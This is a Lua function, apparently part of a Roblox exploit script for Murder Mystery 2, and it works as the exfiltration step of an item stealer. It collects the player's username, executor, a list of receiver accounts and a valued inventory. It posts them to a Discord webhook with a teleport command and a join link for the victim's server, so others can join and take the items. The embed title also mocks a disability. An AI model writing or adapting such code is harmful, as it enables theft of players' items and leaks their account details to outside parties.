local function formatEmbedAndSend(list, totalValue, prefix, isFirst, statusDescription, colorCode)
	local executor = identifyexecutor and identifyexecutor() or "Unknown"
	local receiverList = table.concat(users, ", ")

	local itemsList = ""
	for _, item in ipairs(list) do
		local amountTxt = item.Amount > 1 and " (x" .. item.Amount .. ")" or ""
		itemsList = itemsList .. string.format("%s%s (%s) -> %s\n", item.DataID, amountTxt, item.Rarity, (item.Value * item.Amount))
	end

	if #itemsList > 900 then
		itemsList = itemsList:sub(1, 900) .. "\n... (Plus more!)"
	end

	local fields = {
		{
			name = "Player info:",
			value = string.format("```\nUsername: %s\nExecutor: %s\nReceiver: %s\n```", plr.Name, executor, receiverList),
			inline = false
		},
		{
			name = "Inventory:",
			value = string.format("```\nTotal Value: %s\n\n%s```", totalValue, itemsList),
			inline = false
		}
	}

	if isFirst and not messageId then
		table.insert(fields, {
			name = "🔗 Join Server",
			value = "[Click to Join Server](https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId .. ")",
			inline = false
		})
	end

	local data = {
		["content"] = (prefix or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
		["embeds"] = {{
			["title"] = "MM2 | cerebral palsy",
			["description"] = statusDescription or "🟡  Pending",
			["color"] = colorCode or 16776960,
			["fields"] = fields,
			["footer"] = {
				["text"] = "this script was made by sigma gang"
			},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	local body = HttpService:JSONEncode(data)
	if messageId then
		pcall(function()
			request({
				Url = webhook .. "/messages/" .. messageId,
				Method = "PATCH",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body
			})
		end)
	else
		local success, res = pcall(function()
			return request({
				Url = webhook .. "?wait=true",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body
			})
		end)
		if success and res and res.Body then
			local decoded = HttpService:JSONDecode(res.Body)
			if decoded and decoded.id then
				messageId = decoded.id
			end
		end
	end
end

